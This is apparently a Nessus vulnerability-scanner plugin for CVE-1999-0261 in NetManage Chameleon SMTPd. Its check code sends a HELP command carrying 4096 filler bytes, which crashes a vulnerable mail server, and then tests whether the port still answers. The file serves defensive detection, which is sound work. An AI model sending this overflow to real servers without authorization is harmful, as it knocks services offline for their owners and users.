#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10042);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-1999-0261");
 script_bugtraq_id(2387);
 script_xref(name:"OSVDB", value:"36");

 script_name(english:"NetManage Chameleon SMTPd Remote Overflow DoS");
 script_summary(english:"Determines if smtpd can be crashed"); 
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote SMTP server has a buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host appears to be running NetManage Chameleon SMTPd.\n\n",
     "This version of the software has a remote buffer overflow\n",
     "vulnerability.  Nessus crashed the service by issuing a long argument\n",
     "to the HELP command.  A remote attacker could exploit this issue to\n",
     "crash the service, or possibly execute arbitrary code.\n\n",
     "There is also a buffer overflow related to the HELO command, but\n",
     "Nessus has not checked for this issue."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1998_2/0232.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"SMTP problems"); 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))soc = open_sock_tcp(port);
else exit(0);
if(soc)
{
 b = smtp_recv_banner(socket:soc);
 c = string("HELP ", crap(4096), "\r\n");
 send(socket:soc, data:c);
 close(soc);
 soc2 = open_sock_tcp(port);
 if(!soc2)security_hole(port);
 else close(soc2);
}
